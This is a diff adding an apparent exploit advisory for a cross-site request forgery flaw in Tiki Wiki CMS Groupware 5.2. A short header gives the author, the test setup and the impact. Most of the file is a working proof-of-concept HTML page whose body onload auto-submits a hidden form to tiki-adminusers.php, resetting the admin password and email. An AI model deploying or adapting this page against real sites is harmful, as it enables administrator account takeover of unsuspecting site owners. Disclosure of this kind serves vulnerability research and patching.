@@ -1,0 +1,34 @@
+<!------------------------------------------------------------------------
+# Software................Tiki Wiki CMS Groupware 5.2
+# Vulnerability...........Cross-site Request Forgery
+# Download................htp://www.tiki.org
+# Release Date............9/24/2010
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................John Leitch
+# Site....................http://www.johnleitch.net/
+# Email...................john.leitch5@gmail.com
+# ------------------------------------------------------------------------
+# 
+# --Description--
+# 
+# A cross-site request forgery vulnerability in Tiki Wiki CMS Groupware
+# 5.2 can be exploited to change the admin password.
+# 
+# 
+# --PoC-->
+
+<html>
+    <body onload="document.forms[0].submit.click()">
+        <form method="POST" action="http://localhost/tiki-5.2/tiki-adminusers.php">
+            <input type="hidden" name="name" value="admin" />
+            <input type="hidden" name="pass" value="Password2" />
+            <input type="hidden" name="pass2" value="Password2" />
+            <input type="hidden" name="genepass" value="" />
+            <input type="hidden" name="email" value="test@test.com" />
+            <input type="hidden" name="user" value="1" />
+            <input type="hidden" name="edituser" value="1" />            
+            <input type="submit" name="submit" value="Save" />  
+        </form>
+    </body>
+</html>
